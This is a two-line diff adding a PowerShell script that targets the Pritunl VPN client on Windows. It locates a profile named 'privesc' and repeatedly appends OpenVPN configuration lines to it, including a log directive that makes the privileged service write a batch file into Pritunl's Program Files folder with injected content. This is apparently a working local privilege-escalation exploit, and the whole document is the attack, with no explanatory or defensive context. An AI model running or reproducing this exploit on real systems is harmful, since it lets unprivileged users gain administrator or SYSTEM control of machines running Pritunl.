@@ -1,0 +1,2 @@
+$profile_id = ((Select-String '{"name":"privesc"' $env:APPDATA\pritunl\profiles\*).filename).split('.')[0];
+while (1){"client`ntls-client`ndev TUN`nlog `"C:\\Program Files (x86)\\Pritunl\\ipconfig.bat`"`nauth-user-pass`nca `"INJECTED CONTENT`"" | Add-Content "C:\ProgramData\Pritunl\$profile_id"}
